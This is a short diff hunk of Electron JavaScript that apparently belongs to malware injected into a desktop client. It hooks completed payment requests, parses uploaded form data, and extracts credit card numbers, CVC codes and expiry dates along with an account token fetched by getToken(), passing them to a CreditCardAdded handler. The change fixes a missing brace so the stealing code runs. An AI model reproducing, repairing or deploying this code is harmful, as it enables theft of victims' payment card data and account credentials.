@@ -617,7 +617,7 @@ createWindow();
 session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
     if (![200, 202].includes(details.statusCode)) return;
     if (details.method != 'POST') return;
-    switch (true)
+    switch (true) {
         case details.url.endsWith('tokens'):
             const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
             CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
